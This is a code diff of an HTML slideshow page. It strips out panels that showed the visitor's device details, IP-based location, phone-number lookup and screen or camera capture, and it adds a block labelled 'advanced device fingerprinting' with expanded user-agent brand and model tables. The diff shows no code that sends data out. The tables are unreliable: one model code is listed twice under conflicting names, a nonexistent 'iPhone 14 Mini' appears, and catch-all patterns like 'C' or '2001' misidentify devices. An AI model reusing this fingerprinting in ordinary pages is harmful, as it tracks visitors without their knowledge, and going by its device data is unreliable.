@@ -181,314 +181,6 @@
             box-shadow: none;
         }
 
-        .info-section {
-            padding: 20px;
-            background: white;
-            border-top: 1px solid #e0e0e0;
-        }
-
-        .info-section h3 {
-            color: #333;
-            margin-bottom: 15px;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .info-section h3::before {
-            content: '';
-            display: inline-block;
-            width: 4px;
-            height: 20px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 2px;
-        }
-
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 10px;
-        }
-
-        .info-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 12px 15px;
-            background: #f8f9fa;
-            border-radius: 8px;
-            font-size: 14px;
-            transition: all 0.3s ease;
-            border: 1px solid transparent;
-        }
-
-        .info-item:hover {
-            background: #f0f0f0;
-            border-color: #667eea;
-            transform: translateX(5px);
-        }
-
-        .label {
-            color: #666;
-            font-weight: 600;
-        }
-
-        .value {
-            color: #333;
-            font-family: 'Courier New', monospace;
-            word-break: break-all;
-        }
-
-        .section-divider {
-            height: 1px;
-            background: linear-gradient(to right, transparent, #e0e0e0, transparent);
-            margin: 20px 0;
-        }
-
-        .device-section {
-            padding: 20px;
-            background: #fafbfc;
-            border-top: 1px solid #e0e0e0;
-        }
-
-        .device-section h3 {
-            color: #333;
-            margin-bottom: 15px;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .device-section h3::before {
-            content: '';
-            display: inline-block;
-            width: 4px;
-            height: 20px;
-            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
-            border-radius: 2px;
-        }
-
-        .status {
-            padding: 12px 15px;
-            border-radius: 8px;
-            font-size: 13px;
-            margin-top: 15px;
-            text-align: center;
-            transition: all 0.3s ease;
-        }
-
-        .status.success {
-            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-
-        .status.error {
-            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-
-        .status.loading {
-            background: linear-gradient(135deg, #d1ecf1 0%, #bee5eb 100%);
-            color: #0c5460;
-            border: 1px solid #bee5eb;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.7;
-            }
-        }
-
-        .phone-section {
-            padding: 20px;
-            background: white;
-            border-top: 1px solid #e0e0e0;
-        }
-
-        .phone-section h3 {
-            color: #333;
-            margin-bottom: 15px;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .phone-section h3::before {
-            content: '';
-            display: inline-block;
-            width: 4px;
-            height: 20px;
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            border-radius: 2px;
-        }
-
-        .phone-input-container {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-
-        .phone-input {
-            flex: 1;
-            padding: 12px 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
-            font-size: 14px;
-            transition: all 0.3s ease;
-            font-family: 'Courier New', monospace;
-        }
-
-        .phone-input:focus {
-            outline: none;
-            border-color: #667eea;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-        }
-
-        .phone-input::placeholder {
-            color: #aaa;
-        }
-
-        .analyze-btn {
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            white-space: nowrap;
-        }
-
-        .analyze-btn:hover {
-            background: linear-gradient(135deg, #f5576c 0%, #f093fb 100%);
-        }
-
-        .phone-result {
-            margin-top: 15px;
-            padding: 15px;
-            background: #f8f9fa;
-            border-radius: 8px;
-            display: none;
-        }
-
-        .phone-result.show {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .capture-section {
-            padding: 20px;
-            background: linear-gradient(135deg, #fafbfc 0%, #f0f0f0 100%);
-            border-top: 1px solid #e0e0e0;
-        }
-
-        .capture-section h3 {
-            color: #333;
-            margin-bottom: 15px;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .capture-section h3::before {
-            content: '';
-            display: inline-block;
-            width: 4px;
-            height: 20px;
-            background: linear-gradient(135deg, #ff6b6b 0%, #ffa500 100%);
-            border-radius: 2px;
-        }
-
-        .capture-buttons {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            margin-bottom: 15px;
-        }
-
-        .capture-btn {
-            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
-        }
-
-        .capture-btn:hover {
-            background: linear-gradient(135deg, #ee5a24 0%, #ff6b6b 100%);
-        }
-
-        .camera-btn {
-            background: linear-gradient(135deg, #00b894 0%, #00cec9 100%);
-        }
-
-        .camera-btn:hover {
-            background: linear-gradient(135deg, #00cec9 0%, #00b894 100%);
-        }
-
-        .capture-preview {
-            display: none;
-            margin-top: 15px;
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-        }
-
-        .capture-preview.show {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .capture-preview img {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-
-        .capture-preview video {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-
-        .camera-container {
-            position: relative;
-            margin-top: 15px;
-            display: none;
-        }
-
-        .camera-container.show {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .camera-container video {
-            width: 100%;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-        }
-
-        .camera-controls {
-            display: flex;
-            gap: 10px;
-            margin-top: 10px;
-            justify-content: center;
-        }
-
-        .capture-status {
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 13px;
-            text-align: center;
-            margin-top: 10px;
-            display: none;
-        }
-
-        .capture-status.show {
-            display: block;
-            animation: fadeIn 0.3s ease;
-        }
-
         @media (max-width: 600px) {
             .header h1 {
                 font-size: 20px;
@@ -505,18 +197,6 @@
             button {
                 flex: 1;
                 min-width: 100px;
-            }
-
-            .phone-input-container {
-                flex-direction: column;
-            }
-
-            .info-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .capture-buttons {
-                flex-direction: column;
             }
         }
     </style>
@@ -555,204 +235,6 @@
             <button id="play-btn" onclick="toggleAutoPlay()">Auto Play</button>
             <button id="next-btn" onclick="nextSlide()">Next →</button>
         </div>
-
-        <div class="device-section">
-            <h3>Device Information</h3>
-            <div class="info-grid">
-                <div class="info-item">
-                    <span class="label">Device Name:</span>
-                    <span class="value" id="device-name">Detecting...</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Computer/Host Name:</span>
-                    <span class="value" id="computer-name">Detecting...</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Device Brand:</span>
-                    <span class="value" id="device-brand">Detecting...</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Device Model:</span>
-                    <span class="value" id="device-model">Detecting...</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Platform:</span>
-                    <span class="value" id="platform">Detecting...</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">User Agent:</span>
-                    <span class="value" id="user-agent">Detecting...</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Browser:</span>
-                    <span class="value" id="browser-name">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Browser Version:</span>
-                    <span class="value" id="browser-version">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Operating System:</span>
-                    <span class="value" id="os-name">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">OS Version:</span>
-                    <span class="value" id="os-version">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Device Type:</span>
-                    <span class="value" id="device-type">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Screen Resolution:</span>
-                    <span class="value" id="screen-res">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Viewport Size:</span>
-                    <span class="value" id="viewport-size">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Color Depth:</span>
-                    <span class="value" id="color-depth">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Pixel Ratio:</span>
-                    <span class="value" id="pixel-ratio">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Touch Support:</span>
-                    <span class="value" id="touch-support">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Language:</span>
-                    <span class="value" id="language">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Timezone:</span>
-                    <span class="value" id="timezone">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">CPU Cores:</span>
-                    <span class="value" id="cpu-cores">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Memory:</span>
-                    <span class="value" id="memory">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Connection Type:</span>
-                    <span class="value" id="connection-type">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Online Status:</span>
-                    <span class="value" id="online-status">-</span>
-                </div>
-            </div>
-            <div id="device-status" class="status loading">Retrieving device information...</div>
-        </div>
-
-        <div class="capture-section">
-            <h3>Screen & Camera Capture</h3>
-            <p style="font-size: 13px; color: #666; margin-bottom: 15px;">
-                Capture your screen or camera. Browser permission required for each capture.
-            </p>
-            <div class="capture-buttons">
-                <button class="capture-btn" onclick="captureScreen()">Screen Capture</button>
-                <button class="camera-btn" id="start-camera-btn" onclick="startCamera()">Start Camera</button>
-                <button class="capture-btn" id="take-photo-btn" onclick="takePhoto()" style="display: none;">Take Photo</button>
-                <button id="stop-camera-btn" onclick="stopCamera()" style="display: none; background: #dc3545;">Stop Camera</button>
-            </div>
-            <div id="capture-status" class="capture-status"></div>
-            <div id="camera-container" class="camera-container">
-                <video id="camera-video" autoplay playsinline></video>
-            </div>
-            <div id="capture-preview" class="capture-preview">
-                <img id="capture-image" alt="Capture Preview">
-            </div>
-        </div>
-
-        <div class="info-section">
-            <h3>Your Location Information</h3>
-            <div class="info-grid">
-                <div class="info-item">
-                    <span class="label">Your IP Address:</span>
-                    <span class="value" id="ip-address">Detecting...</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Country:</span>
-                    <span class="value" id="country">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">City:</span>
-                    <span class="value" id="city">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Region:</span>
-                    <span class="value" id="region">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">District:</span>
-                    <span class="value" id="district">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Latitude:</span>
-                    <span class="value" id="latitude">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Longitude:</span>
-                    <span class="value" id="longitude">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">ISP:</span>
-                    <span class="value" id="isp">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Organization:</span>
-                    <span class="value" id="org">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">ASN:</span>
-                    <span class="value" id="asn">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Postal Code:</span>
-                    <span class="value" id="postal">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Country Code:</span>
-                    <span class="value" id="country-code">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Continent:</span>
-                    <span class="value" id="continent">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Timezone:</span>
-                    <span class="value" id="loc-timezone">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Currency:</span>
-                    <span class="value" id="currency">-</span>
-                </div>
-                <div class="info-item">
-                    <span class="label">Timestamp:</span>
-                    <span class="value" id="timestamp">-</span>
-                </div>
-            </div>
-            <div id="status" class="status loading">Retrieving your location information...</div>
-        </div>
-
-        <div class="phone-section">
-            <h3>Phone Number Information</h3>
-            <div class="phone-input-container">
-                <input type="text" id="phone-input" class="phone-input" placeholder="Enter phone number with country code (e.g., +639123456789)" maxlength="20">
-                <button class="analyze-btn" onclick="analyzePhoneNumber()">Analyze</button>
-            </div>
-            <div class="phone-result" id="phone-result">
-                <div class="info-grid" id="phone-info-grid">
-                </div>
-            </div>
-        </div>
     </div>
 
     <script>
@@ -761,7 +243,6 @@
         let autoPlayInterval = null;
         const slides = document.querySelectorAll('.slide');
         const totalSlides = slides.length;
-        let cameraStream = null;
 
         document.getElementById('total-slides').textContent = totalSlides;
 
@@ -793,6 +274,10 @@
                 clearInterval(autoPlayInterval);
             }
         }
+
+        // ============================================
+        // ADVANCED DEVICE FINGERPRINTING
+        // ============================================
 
         function getBrowserInfo() {
             const ua = navigator.userAgent;
@@ -853,32 +338,38 @@
             return { browserName, browserVersion, osName, osVersion };
         }
 
-        function getDeviceBrand() {
+        function getPhoneBrand() {
             const ua = navigator.userAgent;
 
-            const mobileBrands = [
+            const phoneBrands = [
                 { brand: 'Apple', patterns: ['iPhone', 'iPad', 'iPod'] },
-                { brand: 'Samsung', patterns: ['Samsung', 'SM-', 'GT-', 'SGH-', 'SCH-'] },
-                { brand: 'Huawei', patterns: ['Huawei', 'HUAWEI', 'HONOR', 'HW-'] },
-                { brand: 'Xiaomi', patterns: ['Xiaomi', 'Mi ', 'MI ', 'Redmi', 'POCO'] },
-                { brand: 'OPPO', patterns: ['OPPO', 'OPPO-', 'CPH', 'CPHT', 'A5', 'A9', 'A1', 'R7', 'R9', 'R15'] },
-                { brand: 'Vivo', patterns: ['Vivo', 'vivo', 'VIVO', 'V1', 'V3', 'V5', 'V7', 'V9', 'V11', 'V17', 'V19', 'V20', 'V21', 'V23', 'V25', 'V27', 'V29', 'X1', 'X3', 'X5', 'X6', 'X7', 'X9', 'X11', 'X21', 'X23', 'X27', 'X30', 'X50', 'X51', 'X60', 'X70', 'X80', 'X90', 'X100', 'Y1', 'Y3', 'Y5', 'Y7', 'Y9', 'Y11', 'Y12', 'Y15', 'Y19', 'Y20', 'Y21', 'Y28', 'Y30', 'Y33', 'Y35', 'Y53', 'Y55', 'Y71', 'Y73', 'Y75', 'Y81', 'Y91', 'Y93'] },
-                { brand: 'Realme', patterns: ['Realme', 'realme', 'REALME', 'RMX', 'RMP'] },
-                { brand: 'OnePlus', patterns: ['OnePlus', 'ONEPLUS', 'A000', 'A100', 'A200', 'A300', 'A500', 'A600', 'A601', 'AC200', 'HD190', 'HD191', 'HD192'] },
-                { brand: 'Nokia', patterns: ['Nokia', 'NOKIA', 'TA-', 'RM-', 'RX-'] },
-                { brand: 'Sony', patterns: ['Sony', 'Xperia', 'SOV', 'SO-'] },
-                { brand: 'LG', patterns: ['LG', 'LG-', 'LM-', 'LGM-'] },
-                { brand: 'HTC', patterns: ['HTC', 'HTC_'] },
-                { brand: 'Motorola', patterns: ['Motorola', 'MOTOROLA', 'moto', 'Moto', 'XT', 'MZ', 'MZB'] },
-                { brand: 'Asus', patterns: ['Asus', 'ASUS', 'Zenfone', 'ASUS_'] },
-                { brand: 'Google', patterns: ['Pixel', 'Pixel 2', 'Pixel 3', 'Pixel 4', 'Pixel 5', 'Pixel 6', 'Pixel 7', 'Pixel 8', 'Pixel 9', 'Pixel Fold', 'Pixel Tablet'] },
-                { brand: 'Lenovo', patterns: ['Lenovo', 'LENOVO', 'Lenovo-', 'TB-', 'YT-', 'L180', 'L200', 'L700', 'L930', 'P2', 'Z6', 'Z5'] },
-                { brand: 'ZTE', patterns: ['ZTE', 'ZTE-', 'Blade', 'Nubia', 'NX'] },
-                { brand: 'Tecno', patterns: ['Tecno', 'TECNO', 'Tecno-', 'Infinix', 'Infinix-', 'TECNO-', 'itel', 'itel-'] },
-                { brand: 'BlackBerry', patterns: ['BlackBerry', 'BB', 'Blackberry'] }
+                { brand: 'Samsung', patterns: ['Samsung', 'SM-', 'GT-', 'SGH-', 'SCH-', 'SPH-', 'SVM-', 'SHW-'] },
+                { brand: 'Huawei', patterns: ['Huawei', 'HUAWEI', 'HONOR', 'HW-', 'MHA-', 'LLD-', 'LLQ-', 'STF-', 'DUK-', 'CLT-', 'ELE-', 'VOG-', 'MAR-', 'YAL-', 'TNY-', 'NEN-', 'ANA-', 'HWV-', 'EVR-', 'VOG-'] },
+                { brand: 'Xiaomi', patterns: ['Xiaomi', 'Mi ', 'Mi9', 'Mi10', 'Mi11', 'Mi12', 'MI ', 'Redmi', 'POCO', 'M200', 'M201', 'M210', 'M211', 'M2007', 'M2004', 'M190', 'M191', 'M192', 'M193', 'M2006', 'M2003'] },
+                { brand: 'OPPO', patterns: ['OPPO', 'OPPO-', 'CPH', 'CPHT', 'A5', 'A9', 'A1', 'A3', 'A7', 'R7', 'R9', 'R11', 'R15', 'R17', 'Reno', 'Find', 'PAC', 'PACT', 'PBAT', 'PBBT', 'PBCM', 'PBEM', 'PBET'] },
+                { brand: 'Vivo', patterns: ['Vivo', 'vivo', 'VIVO', 'V19', 'V20', 'V21', 'V23', 'V25', 'V27', 'V29', 'X50', 'X51', 'X60', 'X70', 'X80', 'X90', 'X100', 'Y11', 'Y12', 'Y15', 'Y19', 'Y20', 'Y21', 'Y28', 'Y30', 'Y33', 'Y35', 'Y53', 'Y55', 'Y71', 'Y73', 'Y75', 'Y81', 'Y91', 'Y93', '1901', '1904', '1906', '1914', '1915', '1916', '1918', '1919', '1920', '1921', '1923', '1925', '1927', '1929', '1933', '1935', '1937', '1938', '1939', '1941', '1943', '1945', '1946', '2001', '2004', '2005', '2006', '2007', '2008', '2009', '2010', '2011', '2012', '2013', '2014', '2015', '2016', '2017', '2018', '2019', '2020', '2021', '2022', '2023', '2024', '2025', '2026', '2027', '2028', '2029', '2031', '2032', '2034', '2035', '2036', '2037', '2038', '2039', '2040', '2050', '2051', '2052', '2053', '2054', '2055', '2056', '2057', '2058', '2059', '2061', '2062', '2063', '2064', '2065', '2066', '2067', '2068', '2069', '2070', '2071', '2072', '2073', '2074', '2075', '2076', '2077', '2078', '2079', '2080', '2081', '2082', '2083', '2084', '2085', '2086', '2087', '2088', '2089', '2090', '2091', '2092', '2093', '2094', '2095', '2096', '2097', '2098', '2099', '2100', '2101', '2102', '2103', '2104', '2105', '2106', '2107', '2108', '2109', '2110', '2111', '2112', 'I1910', 'I2012', 'I2022', 'I2208', 'I2215', 'I2222', 'I2228', 'I2263', 'I2266', 'I2267', 'I2268', 'I2269', 'I2270', 'I2271', 'I2272', 'I2273', 'I2274', 'I2275', 'I2276', 'I2277', 'I2278', 'I2279', 'I2280', 'I2281', 'I2282', 'I2283', 'I2284', 'I2285', 'I2286', 'I2287', 'I2288', 'I2289', 'I2290', 'I2291', 'I2292'] },
+                { brand: 'Realme', patterns: ['Realme', 'realme', 'REALME', 'RMX', 'RMP', 'RNX', 'RMXA'] },
+                { brand: 'OnePlus', patterns: ['OnePlus', 'ONEPLUS', 'A000', 'A100', 'A200', 'A300', 'A500', 'A600', 'A601', 'AC200', 'AC201', 'AC203', 'HD190', 'HD191', 'HD192', 'LE210', 'LE211', 'LE212', 'LEA3', 'LE2', 'LE5', 'LE9', 'CPH', 'IN30', 'IN31', 'IN55', 'IN51', 'IN201', 'IN202', 'IN203'] },
+                { brand: 'Nokia', patterns: ['Nokia', 'NOKIA', 'TA-', 'RM-', 'RX-', 'Nokia1', 'Nokia2', 'Nokia3', 'Nokia4', 'Nokia5', 'Nokia6', 'Nokia7', 'Nokia8', 'Nokia9', 'Nokia X', 'Nokia G', 'Nokia C', 'Nokia Pure'] },
+                { brand: 'Sony', patterns: ['Sony', 'Xperia', 'SOV', 'SO-', 'SGP', 'D25', 'D26', 'D27', 'D28', 'D29', 'C68', 'C69', 'C23', 'XQ-', 'XQ-A', 'XQ-B', 'XQ-C', 'XQ-D', 'XQ-E'] },
+                { brand: 'LG', patterns: ['LG', 'LG-', 'LM-', 'LGM-', 'LG-H', 'LG-K', 'LG-M', 'LG-Q', 'LG-Stylo', 'LG-V', 'LG-G'] },
+                { brand: 'HTC', patterns: ['HTC', 'HTC_', 'HTC-One', 'HTC-Desire', 'HTC-U'] },
+                { brand: 'Motorola', patterns: ['Motorola', 'MOTOROLA', 'moto', 'Moto', 'moto e', 'moto g', 'Moto G', 'Moto E', 'XT', 'MZ', 'MZB', 'PA-', 'PB-', 'PD-', 'PE-', 'PF-', 'PG-', 'PH-', 'PI-', 'PJ-', 'PK-', 'PL-', 'PM-'] },
+                { brand: 'Asus', patterns: ['Asus', 'ASUS', 'Zenfone', 'ASUS_', 'ZB-', 'ZE-', 'ZC-', 'ZD-', 'ZF-', 'AI-', 'Rog', 'ROG', 'ASUSAI'] },
+                { brand: 'Google', patterns: ['Pixel', 'Pixel 2', 'Pixel 3', 'Pixel 4', 'Pixel 5', 'Pixel 6', 'Pixel 7', 'Pixel 8', 'Pixel 9', 'Pixel Fold', 'Pixel Tablet', 'G-'] },
+                { brand: 'Lenovo', patterns: ['Lenovo', 'LENOVO', 'Lenovo-', 'TB-', 'YT-', 'L180', 'L200', 'L700', 'L930', 'P2', 'Z6', 'Z5', 'K-', 'K5', 'K6', 'K8', 'K9', 'K10', 'K11', 'K12', 'K13', 'K14', 'K15', 'Z90', 'ZUK'] },
+                { brand: 'ZTE', patterns: ['ZTE', 'ZTE-', 'Blade', 'Nubia', 'NX', 'NXA', 'NXJ', 'Z8', 'Z9', 'Z9A', 'Z9L', 'Z97', 'Z93', 'Z95', 'Z96', 'Z98'] },
+                { brand: 'Tecno', patterns: ['Tecno', 'TECNO', 'Tecno-', 'Infinix', 'Infinix-', 'itel', 'itel-', 'TECNO-', 'Infinix X', 'Infinix Note', 'Infinix Hot', 'Tecno Spark', 'Tecno Camon', 'Tecno Phantom', 'itel A', 'itel P', 'itel S'] },
+                { brand: 'BlackBerry', patterns: ['BlackBerry', 'BB', 'Blackberry', 'STV', 'PRIV', 'KEY', 'Motion'] },
+                { brand: 'Alcatel', patterns: ['Alcatel', 'ALCATEL', 'TCL', '50', '501', '502', '503', '504', '505', '506', '507', '508', '509', '5011', '5012', '5013', '5015', '5016', '5017', '5018', '5019', '5021', '5022', '5023', '5024', '5025', '5026', '5027', '5028', '5029'] },
+                { brand: 'Wiko', patterns: ['Wiko', 'WIKO', 'Lenovo-', 'VIM', 'U-', 'U30', 'U50', 'U60', 'U70', 'U75', 'U93', 'W-', 'W-K', 'W-U'] },
+                { brand: 'Honor', patterns: ['Honor', 'HONOR', 'STK', 'DLI', 'LLD', 'BKL', 'COL', 'PCT', 'YAL', 'HKY', 'BRT', 'BMH', 'BMH-', 'MOA', 'FYD', 'ENA', 'NTH', 'ANY', 'TNA', 'VNA', 'ELZ', 'TYS'] },
+                { brand: 'Oukitel', patterns: ['Oukitel', 'OUKITEL', 'K-', 'K3', 'K5', 'K6', 'K7', 'K8', 'K9', 'K10', 'K12', 'K13', 'K15', 'C', 'C21', 'C22', 'C23', 'WP', 'WP2', 'WP5', 'WP6', 'WP7', 'WP8', 'WP9', 'WP10', 'WP15', 'WP18', 'WP19', 'WP21', 'WP22', 'RT', 'U'] },
+                { brand: 'Doogee', patterns: ['Doogee', 'DOOGEE', 'DG', 'S-', 'S40', 'S50', 'S55', 'S60', 'S68', 'S70', 'S80', 'S88', 'S89', 'S96', 'S97', 'S98', 'S99', 'V', 'X', 'Y', 'BL', 'BL120', 'BL150', 'BL550', 'BL7000'] },
+                { brand: 'Ulefone', patterns: ['Ulefone', 'ULEFONE', 'Power', 'Armor', 'Note', 'U0', 'T', 'U008', 'U007', 'U010', 'U011', 'U012', 'U013', 'U014', 'U015', 'U016', 'U017'] }
             ];
 
-            for (const item of mobileBrands) {
+            for (const item of phoneBrands) {
                 for (const pattern of item.patterns) {
                     if (ua.includes(pattern)) {
                         return item.brand;
@@ -894,24 +385,76 @@
             return 'Unknown Brand';
         }
 
-        function getDeviceModel() {
+        function getPhoneModel() {
             const ua = navigator.userAgent;
 
-            // iOS Devices
-            const iosModels = {
-                'iPhone': 'iPhone',
-                'iPad': 'iPad',
-                'iPod': 'iPod touch'
-            };
-
-            for (const [key, value] of Object.entries(iosModels)) {
-                if (ua.includes(key)) {
-                    const modelMatch = ua.match(/\((iPhone\d,\d|iPad\d,\d|iPod\d,\d)\)/);
-                    if (modelMatch) {
-                        return `${value} (${modelMatch[1]})`;
-                    }
-                    return value;
+            // iOS Devices - extract model number
+            if (ua.includes('iPhone')) {
+                const iosModels = {
+                    'iPhone1,1': 'iPhone (1st Gen)',
+                    'iPhone1,2': 'iPhone 3G',
+                    'iPhone2,1': 'iPhone 3GS',
+                    'iPhone3,1': 'iPhone 4 (GSM)',
+                    'iPhone3,2': 'iPhone 4 (GSM Rev A)',
+                    'iPhone3,3': 'iPhone 4 (CDMA)',
+                    'iPhone4,1': 'iPhone 4S',
+                    'iPhone5,1': 'iPhone 5 (GSM)',
+                    'iPhone5,2': 'iPhone 5 (Global)',
+                    'iPhone5,3': 'iPhone 5C (GSM)',
+                    'iPhone5,4': 'iPhone 5C (Global)',
+                    'iPhone6,1': 'iPhone 5S (GSM)',
+                    'iPhone6,2': 'iPhone 5S (Global)',
+                    'iPhone7,1': 'iPhone 6 Plus',
+                    'iPhone7,2': 'iPhone 6',
+                    'iPhone8,1': 'iPhone 6s',
+                    'iPhone8,2': 'iPhone 6s Plus',
+                    'iPhone8,4': 'iPhone SE (1st Gen)',
+                    'iPhone9,1': 'iPhone 7 (GSM)',
+                    'iPhone9,2': 'iPhone 7 Plus (GSM)',
+                    'iPhone9,3': 'iPhone 7 (Global)',
+                    'iPhone9,4': 'iPhone 7 Plus (Global)',
+                    'iPhone10,1': 'iPhone 8 (GSM)',
+                    'iPhone10,2': 'iPhone 8 Plus (GSM)',
+                    'iPhone10,3': 'iPhone X (GSM)',
+                    'iPhone10,4': 'iPhone 8 (Global)',
+                    'iPhone10,5': 'iPhone 8 Plus (Global)',
+                    'iPhone10,6': 'iPhone X (Global)',
+                    'iPhone11,2': 'iPhone XS',
+                    'iPhone11,4': 'iPhone XS Max',
+                    'iPhone11,6': 'iPhone XS Max (China)',
+                    'iPhone11,8': 'iPhone XR',
+                    'iPhone12,1': 'iPhone 11',
+                    'iPhone12,3': 'iPhone 11 Pro',
+                    'iPhone12,5': 'iPhone 11 Pro Max',
+                    'iPhone12,8': 'iPhone SE (2nd Gen)',
+                    'iPhone13,1': 'iPhone 12 mini',
+                    'iPhone13,2': 'iPhone 12',
+                    'iPhone13,3': 'iPhone 12 Pro',
+                    'iPhone13,4': 'iPhone 12 Pro Max',
+                    'iPhone14,2': 'iPhone 13 Pro',
+                    'iPhone14,3': 'iPhone 13 Pro Max',
+                    'iPhone14,4': 'iPhone 13 mini',
+                    'iPhone14,5': 'iPhone 13',
+                    'iPhone14,6': 'iPhone 13 (Starlight)',
+                    'iPhone14,7': 'iPhone 13 (Blue)',
+                    'iPhone14,8': 'iPhone 13 (Pink)',
+                    'iPhone15,2': 'iPhone 14 Pro',
+                    'iPhone15,3': 'iPhone 14 Pro Max',
+                    'iPhone15,4': 'iPhone 14',
+                    'iPhone15,5': 'iPhone 14 Plus',
+                    'iPhone14,3': 'iPhone 14 Pro Max',
+                    'iPhone15,6': 'iPhone 14 (Mini)',
+                    'iPhone16,1': 'iPhone 15 Pro',
+                    'iPhone16,2': 'iPhone 15 Pro Max'
+                };
+                for (const [code, name] of Object.entries(iosModels)) {
+                    if (ua.includes(code)) return name;
                 }
+                return 'iPhone (Unknown Model)';
+            }
+
+            if (ua.includes('iPad')) {
+                return 'iPad';
             }
 
             // Android devices - extract model number
@@ -920,84 +463,7 @@
                 return androidModelMatch[1].trim();
             }
 
-            // Check for specific brand patterns
-            const brandPatterns = [
-                { pattern: /SM-[A-Z]+\d+/i, prefix: 'Samsung ' },
-                { pattern: /Moto [A-Za-z]+\d*/i, prefix: '' },
-                { pattern: /Pixel \d+ ?(Pro|XL|a)?/i, prefix: 'Google ' },
-                { pattern: /RMX\d+/i, prefix: 'Realme ' },
-                { pattern: /CPH\d+/i, prefix: 'OPPO ' },
-                { pattern: /V\d{4}/i, prefix: 'Vivo ' },
-                { pattern: /Redmi Note \d+/i, prefix: '' },
-                { pattern: /Redmi \d+/i, prefix: '' },
-                { pattern: /Mi \d+/i, prefix: 'Xiaomi ' }
-            ];
-
-            for (const item of brandPatterns) {
-                const match = ua.match(item.pattern);
-                if (match) {
-                    return item.prefix + match[0];
-                }
-            }
-
             return 'Unknown Model';
-        }
-
-        function getDeviceName() {
-            const ua = navigator.userAgent;
-            const brand = getDeviceBrand();
-            const model = getDeviceModel();
-
-            // Try to get a more device-friendly name
-            if (navigator.deviceMemory || navigator.hardwareConcurrency) {
-                // Desktop or capable mobile device
-                if (brand !== 'Unknown Brand') {
-                    return brand + (model !== 'Unknown Model' ? ' ' + model : '');
-                }
-            }
-
-            // Fallback to user agent parsing
-            if (ua.includes('iPhone')) return 'Apple iPhone';
-            if (ua.includes('iPad')) return 'Apple iPad';
-            if (ua.includes('iPod')) return 'Apple iPod';
-            if (ua.includes('Android')) {
-                const match = ua.match(/Android.*?;\s*([^;)]+)/);
-                if (match) return match[1].trim();
-            }
-            if (ua.includes('Macintosh')) return 'Apple Mac';
-            if (ua.includes('Windows')) return 'Windows PC';
-            if (ua.includes('Linux')) return 'Linux PC';
-            if (ua.includes('CrOS')) return 'Chromebook';
-
-            return navigator.platform || 'Unknown Device';
-        }
-
-        function getComputerName() {
-            // Browsers don't expose actual computer names for security
-            // But we can show available identifiers
-            const ua = navigator.userAgent;
-            const brand = getDeviceBrand();
-            const model = getDeviceModel();
-
-            // For desktop browsers, try to get some identifier
-            if (ua.includes('Windows')) {
